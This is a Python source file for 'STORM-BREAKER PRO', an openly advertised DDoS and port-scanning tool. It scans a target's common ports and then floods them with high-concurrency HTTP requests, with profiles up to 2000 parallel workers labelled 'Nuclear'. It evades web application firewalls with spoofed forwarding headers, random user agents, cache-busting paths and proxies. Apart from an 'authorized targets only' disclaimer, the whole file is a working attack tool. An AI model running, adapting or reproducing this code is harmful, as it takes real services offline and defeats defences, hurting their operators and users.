#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
STORM-BREAKER PRO v5.0 ULTRA
Advanced Async DDoS & Multi-Port Scanner

Author: @Rrupv
Studio: Moska-studio
GitHub: https://github.com/Moska-studio/storm-breaker
Telegram: https://t.me/Rrupv

⚠️ USE ONLY ON AUTHORIZED TARGETS! ⚠️
"""

import asyncio
import aiohttp
import random
import time
import os
import socket
import json
import csv
import logging
from datetime import datetime
from threading import Lock
import sys

# ============= COLORS & STYLES =============
G, R, C, Y, B, W, M, BG_R, RE = (
    '\033[92m', '\033[91m', '\033[96m', '\033[93m', '\033[94m', '\033[97m', '\033[95m',
    '\033[41m', '\033[0m'
)
BOLD, DIM = '\033[1m', '\033[2m'

# ============= CONFIG =============
SERVICE_PORTS = {
    21: 'FTP', 22: 'SSH', 25: 'SMTP', 53: 'DNS', 80: 'HTTP',
    110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 3306: 'MySQL',
    3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
    8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB', 9200: 'ES'
}

COMMON_PORTS = [80, 8080, 443, 8443, 22, 21, 3306, 5432, 6379, 27017, 5000, 8000, 9000, 2082, 8888]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'curl/8.0.0', 'Wget/1.20.3', 'python-httpx/0.25.0'
]

WAF_PATHS = ['/', '/index.html', '/api/', '/admin/', '/login', '/status', '/health']

PROFILES = {
    '1': {'name': 'Light', 'concurrent': 10, 'timeout': 10},
    '2': {'name': 'Medium', 'concurrent': 50, 'timeout': 5},
    '3': {'name': 'Heavy', 'concurrent': 200, 'timeout': 3},
    '4': {'name': 'Extreme', 'concurrent': 500, 'timeout': 2},
    '5': {'name': 'Nuclear', 'concurrent': 2000, 'timeout': 1}
}

PROJECT_NAME = "STORM-BREAKER PRO v5.0 ULTRA"
PROJECT_AUTHOR = "@Rrupv"
PROJECT_STUDIO = "Moska-studio"
TELEGRAM_LINK = "https://t.me/Rrupv"
GITHUB_LINK = "https://github.com/Moska-studio/storm-breaker"

logging.basicConfig(level=logging.ERROR, handlers=[logging.FileHandler("storm.log")])
stats_lock = Lock()

class StormProBreaker:
    def __init__(self, profile='2', use_proxy=False, waf_bypass=True):
        self.stats = {
            'total': 0, 'success': 0, 'errors': 0, 'timeout': 0,
            'status_codes': {}, 'response_times': []
        }
        self.start_time = time.time()
        self.profile = PROFILES[profile]
        self.use_proxy = use_proxy
        self.proxy_list = []
        self.waf_bypass = waf_bypass
        self.stop_event = asyncio.Event()
        self.targets = []
        self.animation_frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        self.frame_idx = 0

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def draw_progress_bar(self, current, total, bar_length=40, title=""):
        if total == 0:
            percentage = 0
        else:
            percentage = min(100, (current / total) * 100)
        
        filled = int((percentage / 100) * bar_length)
        bar = '█' * filled + '░' * (bar_length - filled)
        
        if percentage < 50:
            color = R
        elif percentage < 80:
            color = Y
        else:
            color = G
        
        print(f"\r{DIM}{title:<25}{RE} {color}[{bar}]{RE} {BOLD}{percentage:.0f}%{RE}", end='', flush=True)

    def draw_stats_dashboard(self, elapsed):
        self.clear_screen()
        
        print(f"\n{BOLD}{C}╔════════════════════════════════════════════════════════════╗{RE}")
        print(f"{BOLD}{C}║{W}        🌪️  {PROJECT_NAME}  🌪️{C}            ║{RE}")
        print(f"{BOLD}{C}║{G}       Advanced Async DDoS & Port Scanner{C}               ║{RE}")
        print(f"{BOLD}{C}║{Y}  Author: {PROJECT_AUTHOR} | Studio: {PROJECT_STUDIO}{C}         ║{RE}")
        print(f"{BOLD}{C}╚════════════════════════════════════════════════════════════╝{RE}\n")
        
        print(f"{B}{'─'*60}{RE}")
        print(f"{B}┃{RE} {BOLD}LIVE ATTACK STATUS{RE}")
        print(f"{B}{'─'*60}{RE}\n")
        
        rps = self.stats['total'] / max(1, elapsed)
        sr = (self.stats['success'] / max(1, self.stats['total'])) * 100
        
        metrics = [
            (f"⏱️  Time", f"{elapsed}s", C),
            (f"🚀 RPS", f"{rps:.0f}", Y),
            (f"📊 Total", f"{self.stats['total']}", W),
            (f"✓ Success", f"{self.stats['success']}", G),
            (f"✗ Errors", f"{self.stats['errors']}", R),
            (f"⏰ Timeout", f"{self.stats['timeout']}", Y),
        ]
        
        for label, value, color in metrics:
            print(f"{B}┃{RE} {label:<15} {color}{BOLD}{value:>15}{RE}")
        
        print(f"\n{B}┃{RE} {BOLD}Success Rate:{RE}")
        self.draw_progress_bar(self.stats['success'], self.stats['total'], bar_length=35, title="")
        print()
        
        if self.stats['status_codes']:
            print(f"\n{B}┃{RE} {BOLD}Top Status Codes:{RE}")
            top_statuses = sorted(self.stats['status_codes'].items(), key=lambda x: x[1], reverse=True)[:3]
            for status, count in top_statuses:
                pct = count/max(1, self.stats['total'])*100
                print(f"{B}┃{RE}   {status}: {count} ({pct:.1f}%)")
        
        print(f"\n{B}{'─'*60}{RE}\n")

    def animate_loading(self):
        frame = self.animation_frames[self.frame_idx % len(self.animation_frames)]
        self.frame_idx += 1
        return frame

    def banner(self):
        self.clear_screen()
        banner_text = f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║       🌪️  {PROJECT_NAME}  🌪️                  ║
║                                                              ║
║     Advanced Async DDoS & Multi-Port Scanner               ║
║                                                              ║
║         Author: {PROJECT_AUTHOR}                            ║
║         Studio: {PROJECT_STUDIO}                            ║
║         GitHub: {GITHUB_LINK}  ║
║         Telegram: {TELEGRAM_LINK}                       ║
║                                                              ║
║    ⚠️  USE ONLY ON AUTHORIZED TARGETS! ⚠️                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(f"{C}{BOLD}{banner_text}{RE}")
        time.sleep(1)

    def menu_choice(self, options, title="Select Option"):
        print(f"\n{B}╔{'═'*50}╗{RE}")
        print(f"{B}║{RE} {BOLD}{title:<48}{RE} {B}║{RE}")
        print(f"{B}╠{'═'*50}╣{RE}")
        
        for key, desc in options.items():
            print(f"{B}║{RE} {BOLD}{key}.{RE} {desc:<45} {B}║{RE}")
        
        print(f"{B}╚{'═'*50}╝{RE}")
        
        while True:
            choice = input(f"\n{G}[>]{RE} Select: ").strip()
            if choice in options:
                return choice
            print(f"{R}[!] Invalid choice!{RE}")

    def validate_host(self, host):
        try:
            socket.inet_aton(host)
            return True
        except:
            try:
                socket.gethostbyname(host)
                return True
            except:
                return False

    def load_targets_from_file(self, filename):
        try:
            with open(filename, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"{G}[+]{RE} Loaded {BOLD}{len(targets)}{RE} targets from {BOLD}{filename}{RE}")
            return targets
        except:
            print(f"{R}[!]{RE} File not found: {filename}")
            return []

    def scan_port(self, host, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        try:
            return sock.connect_ex((host, port)) == 0
        finally:
            sock.close()

    def get_headers(self):
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        if self.waf_bypass:
            headers.update({
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'Referer': 'https://www.google.com/',
                'Cache-Control': 'no-cache'
            })
        return headers

    def get_random_path(self):
        path = random.choice(WAF_PATHS)
        if random.choice([True, False]):
            path += f"?t={random.randint(1000000, 9999999)}"
        return path

    def get_post_body(self):
        return 'x' * random.randint(100, 1000)

    async def request_sender(self, host, port, use_https=False):
        connector = aiohttp.TCPConnector(limit_per_host=0, limit=0, ssl=False)
        timeout = aiohttp.ClientTimeout(total=self.profile['timeout'])
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while not self.stop_event.is_set():
                try:
                    protocol = 'https' if use_https else 'http'
                    path = self.get_random_path()
                    url = f"{protocol}://{host}:{port}{path}"
                    method = random.choice(['GET', 'POST', 'HEAD'])
                    
                    headers = self.get_headers()
                    proxy = random.choice(self.proxy_list) if self.use_proxy and self.proxy_list else None
                    data = self.get_post_body() if method == 'POST' else None
                    
                    await asyncio.sleep(random.uniform(0.001, 0.05))
                    
                    req_start = time.time()
                    async with session.request(method, url, headers=headers, data=data, proxy=proxy, ssl=False, allow_redirects=False) as resp:
                        await resp.read()
                        response_time = time.time() - req_start
                        
                        with stats_lock:
                            self.stats['total'] += 1
                            self.stats['response_times'].append(response_time)
                            status = resp.status
                            self.stats['status_codes'][status] = self.stats['status_codes'].get(status, 0) + 1
                            if 200 <= status < 500:
                                self.stats['success'] += 1
                            else:
                                self.stats['errors'] += 1
                except asyncio.TimeoutError:
                    with stats_lock:
                        self.stats['timeout'] += 1
                except:
                    with stats_lock:
                        self.stats['errors'] += 1

    async def attack_async(self, host, port, use_https=False):
        tasks = [self.request_sender(host, port, use_https) for _ in range(self.profile['concurrent'])]
        await asyncio.gather(*tasks, return_exceptions=True)

    def scan_ports(self, host):
        print(f"\n{Y}[{self.animate_loading()}]{RE} Scanning {BOLD}{len(COMMON_PORTS)}{RE} ports...\n")
        open_ports = []
        
        for i, port in enumerate(COMMON_PORTS):
            if self.scan_port(host, port):
                service = SERVICE_PORTS.get(port, 'Unknown')
                print(f"  {G}[+]{RE} Port {BOLD}{C}{port}{RE} OPEN {B}[{service}]{RE}")
                open_ports.append(port)
            
            self.draw_progress_bar(i + 1, len(COMMON_PORTS), bar_length=35, title="Scanning")
        
        print(f"\n\n{G}[+]{RE} Found {BOLD}{len(open_ports)}{RE} open ports\n")
        return open_ports

    def export_json(self, filename, target_host, ports):
        elapsed = time.time() - self.start_time
        avg_time = sum(self.stats['response_times']) / len(self.stats['response_times']) if self.stats['response_times'] else 0
        
        results = {
            'tool': PROJECT_NAME,
            'author': PROJECT_AUTHOR,
            'studio': PROJECT_STUDIO,
            'target': target_host,
            'profile': self.profile['name'],
            'timestamp': datetime.now().isoformat(),
            'duration': elapsed,
            'rps': self.stats['total'] / max(1, elapsed),
            'total_requests': self.stats['total'],
            'successful': self.stats['success'],
            'errors': self.stats['errors'],
            'timeouts': self.stats['timeout'],
            'status_codes': self.stats['status_codes'],
            'ports': ports
        }
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2)
            print(f"{G}[+]{RE} JSON Report: {BOLD}{filename}{RE}")
            return True
        except Exception as e:
            print(f"{R}[!]{RE} Error: {e}")
            return False

    def export_csv(self, filename, target_host, ports):
        elapsed = time.time() - self.start_time
        try:
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f)
                w.writerow([PROJECT_NAME])
                w.writerow(['Author', PROJECT_AUTHOR])
                w.writerow(['Studio', PROJECT_STUDIO])
                w.writerow(['GitHub', GITHUB_LINK])
                w.writerow(['Telegram', TELEGRAM_LINK])
                w.writerow([''])
                w.writerow(['Target', target_host])
                w.writerow(['Profile', self.profile['name']])
                w.writerow(['Duration (s)', f"{elapsed:.2f}"])
                w.writerow(['Total Requests', self.stats['total']])
                w.writerow(['RPS', f"{self.stats['total'] / max(1, elapsed):.2f}"])
                w.writerow(['Success', self.stats['success']])
                w.writerow(['Errors', self.stats['errors']])
                w.writerow(['Timeouts', self.stats['timeout']])
            print(f"{G}[+]{RE} CSV Report: {BOLD}{filename}{RE}")
            return True
        except Exception as e:
            print(f"{R}[!]{RE} Error: {e}")
            return False

    def run(self):
        self.banner()
        
        mode_opts = {'1': 'Single Target', '2': 'Batch Mode (targets.txt)'}
        mode = self.menu_choice(mode_opts, "SELECT MODE")
        
        if mode == '2':
            self.targets = self.load_targets_from_file('targets.txt')
            if not self.targets:
                return
        else:
            print(f"\n{B}╔{'─'*50}╗{RE}")
            while True:
                target = input(f"{G}[?]{RE} Target (IP/Domain): ").strip()
                if self.validate_host(target):
                    self.targets = [target]
                    break
                print(f"{R}[!]{RE} Invalid host!")
            print(f"{B}╚{'─'*50}╝{RE}")

        for target in self.targets:
            print(f"\n{Y}[{self.animate_loading()}]{RE} Scanning target: {BOLD}{C}{target}{RE}\n")
            
            open_ports = self.scan_ports(target)
            if not open_ports:
                print(f"{R}[!]{RE} No open ports found!\n")
                continue

            port_opts = {'1': 'Single Port', '2': 'All Open Ports', '3': 'Custom Ports'}
            choice = self.menu_choice(port_opts, "SELECT PORTS")

            if choice == '2':
                ports = open_ports
            elif choice == '1':
                print(f"\n{B}Available ports: {BOLD}{', '.join(map(str, open_ports))}{RE}\n")
                while True:
                    try:
                        p = int(input(f"{G}[?]{RE} Port: "))
                        if p in open_ports:
                            ports = [p]
                            break
                    except:
                        pass
            else:
                custom = input(f"{G}[?]{RE} Ports (comma-separated): ")
                ports = [int(p.strip()) for p in custom.split(',') if p.strip().isdigit()]

            print(f"\n{BG_R}  ATTACK STARTING IN 3 SECONDS...  {RE}\n")
            for i in range(3, 0, -1):
                print(f"\r{R}{BOLD}{i}...{RE}", end='', flush=True)
                time.sleep(1)
            print()

            self.stop_event = asyncio.Event()
            self.stats = {'total': 0, 'success': 0, 'errors': 0, 'timeout': 0, 'status_codes': {}, 'response_times': []}
            self.start_time = time.time()

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            async def run_attack():
                tasks = []
                for port in ports:
                    use_https = port in [443, 8443]
                    tasks.append(self.attack_async(target, port, use_https))
                await asyncio.gather(*tasks, return_exceptions=True)

            import threading
            attack_thread = threading.Thread(target=lambda: loop.run_until_complete(run_attack()), daemon=True)
            attack_thread.start()

            try:
                while attack_thread.is_alive():
                    elapsed = int(time.time() - self.start_time)
                    self.draw_stats_dashboard(elapsed)
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n\n{Y}[!] Stopping attack...{RE}")
                self.stop_event.set()
                time.sleep(2)

            elapsed = time.time() - self.start_time
            rps = self.stats['total'] / max(1, elapsed)
            sr = (self.stats['success'] / max(1, self.stats['total'])) * 100
            avg_time = sum(self.stats['response_times']) / len(self.stats['response_times']) if self.stats['response_times'] else 0

            self.clear_screen()
            print(f"\n{BOLD}{G}╔════════════════════════════════════════════════════════════╗{RE}")
            print(f"{BOLD}{G}║{RE} {BOLD}ATTACK COMPLETED!{RE} {BOLD}{G}                              ║{RE}")
            print(f"{BOLD}{G}╚════════════════════════════════════════════════════════════╝{RE}\n")
            
            print(f"{B}╔{'─'*60}╗{RE}")
            print(f"{B}┃{RE} {BOLD}{PROJECT_NAME}{RE}")
            print(f"{B}┃{RE} {BOLD}Author:{RE} {Y}{PROJECT_AUTHOR}{RE} | {BOLD}Studio:{RE} {Y}{PROJECT_STUDIO}{RE}")
            print(f"{B}├{'─'*60}┤{RE}")
            print(f"{B}┃{RE} {BOLD}Target:{RE}              {C}{target}{RE}")
            print(f"{B}┃{RE} {BOLD}Profile:{RE}             {Y}{self.profile['name']}{RE}")
            print(f"{B}┃{RE} {BOLD}Duration:{RE}            {W}{elapsed:.2f}s{RE}")
            print(f"{B}├{'─'*60}┤{RE}")
            print(f"{B}┃{RE} {BOLD}Total Requests:{RE}      {W}{self.stats['total']}{RE}")
            print(f"{B}┃{RE} {BOLD}RPS:{RE}                 {Y}{rps:.2f}{RE}")
            print(f"{B}┃{RE} {BOLD}Success:{RE}             {G}{self.stats['success']}{RE} ({sr:.1f}%)")
            print(f"{B}┃{RE} {BOLD}Errors:{RE}              {R}{self.stats['errors']}{RE}")
            print(f"{B}┃{RE} {BOLD}Timeouts:{RE}            {Y}{self.stats['timeout']}{RE}")
            print(f"{B}┃{RE} {BOLD}Avg Response:{RE}        {W}{avg_time:.4f}s{RE}")
            print(f"{B}╚{'─'*60}╝{RE}\n")
            
            print(f"{C}📞 Telegram:{RE} {Y}{TELEGRAM_LINK}{RE}")
            print(f"{C}🔗 GitHub:{RE} {Y}{GITHUB_LINK}{RE}\n")

            exp = input(f"{G}[?]{RE} Export results? {BOLD}[y/n]:{RE} ").lower()
            if exp == 'y':
                ts = int(time.time())
                self.export_json(f"storm_results_{ts}.json", target, ports)
                self.export_csv(f"storm_results_{ts}.csv", target, ports)
                print(f"\n{G}[+]{RE} Reports saved!\n")

def main():
    breaker = StormProBreaker()
    breaker.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[!] Stopping...")
        sys.exit()

